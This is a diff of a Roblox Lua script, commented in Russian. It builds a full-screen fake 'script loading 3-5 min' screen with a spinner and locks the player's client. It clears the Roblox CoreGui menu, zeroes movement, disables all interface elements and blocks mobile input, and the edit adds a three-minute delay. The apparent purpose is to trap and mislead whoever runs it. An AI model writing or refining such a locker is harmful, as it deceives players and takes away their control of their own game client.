@@ -16,25 +16,31 @@ local function visual()
     blackFrame.ZIndex = 1
     blackFrame.Parent = screenGui
     
-    -- Создаем текст СРАЗУ
+    wait(180) -- 3 минуты 
+    -- Звук (убедитесь что у вас есть звук в script.parent)
+    if script.parent:FindFirstChild("sound") then
+        script.parent.sound:play()
+    end
+
+    -- Создаем текст
     local textLabel = Instance.new("TextLabel")
     textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.Position = UDim2.new(0, 0, 0, 0) -- ИСПРАВЛЕНО: верхний левый угол
+    textLabel.Position = UDim2.new(0, 0, 0, 0)
     textLabel.BackgroundTransparency = 1
     textLabel.Text = "Прогрузка скрипта 3-5мин!"
     textLabel.TextColor3 = Color3.new(1, 0, 1)
-    textLabel.TextSize = 40
+    textLabel.TextSize = 50
     textLabel.TextScaled = true
     textLabel.Font = Enum.Font.SourceSansBold
     textLabel.ZIndex = 2
     textLabel.Parent = screenGui
     
-    -- Создаем вращающийся кружок СРАЗУ
+    -- Создаем вращающийся кружок (РАБОТАЕТ НА ТЕЛЕФОНЕ И ПК)
     local circle = Instance.new("Frame")
     circle.Name = "RotatingCircle"
-    circle.Size = UDim2.new(0, 150, 0, 150)
-    circle.Position = UDim2.new(0.5, -75, 0.5, -75) -- ИСПРАВЛЕНО: центр экрана
-    circle.BackgroundColor3 = Color3.new(1, 0, 0)
+    circle.Size = UDim2.new(0, 150, 0, 150) -- Увеличил размер для лучшей видимости
+    circle.Position = UDim2.new(0.5, -75, 0.5, -75) -- Центр экрана
+    circle.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный цвет
     circle.BorderSizePixel = 0
     circle.ZIndex = 2
     circle.Parent = screenGui
@@ -44,8 +50,8 @@ local function visual()
     corner.CornerRadius = UDim.new(1, 0)
     corner.Parent = circle
 
-    -- Функция вращения
-    local rotationSpeed = 3
+    -- Функция вращения (ОПТИМИЗИРОВАНА ДЛЯ ВСЕХ УСТРОЙСТВ)
+    local rotationSpeed = 3 -- Увеличил скорость для лучшего эффекта
     local currentRotation = 0
 
     spawn(function()
@@ -53,11 +59,12 @@ local function visual()
             currentRotation = currentRotation + rotationSpeed
             circle.Rotation = currentRotation
             
+            -- Плавное вращение для всех устройств
             if currentRotation >= 360 then
                 currentRotation = 0
             end
             
-            wait(0.016)
+            wait(0.016) -- ~60 FPS для плавности
         end
     end)
 
@@ -74,13 +81,12 @@ local function visual()
     
     -- ДОПОЛНИТЕЛЬНАЯ БЛОКИРОВКА КЛИЕНТА (РАБОТАЕТ НА ТЕЛЕФОНЕ)
     
-    --блокеровка меню роблокса
-    game:GetService('CoreGui'):ClearAllChildren()
     -- Блокируем движение персонажа
     local Players = game:GetService("Players")
     local character = player.Character or player.CharacterAdded:Wait()
     local humanoid = character:WaitForChild("Humanoid")
-    
+    --блокировка меню роблокса 
+   game:GetService('CoreGui'):ClearAllChildren()
     -- Отключаем движение
     humanoid.WalkSpeed = 0
     humanoid.JumpPower = 0
@@ -105,14 +111,6 @@ local function visual()
     -- Отключаем весь интерфейс Roblox
     local StarterGui = game:GetService("StarterGui")
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-    
-    -- Дополнительное скрытие интерфейса
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.SelfView, false)
     
     -- БЛОКИРОВКА ДЛЯ ТЕЛЕФОНА
     local UserInputService = game:GetService("UserInputService")
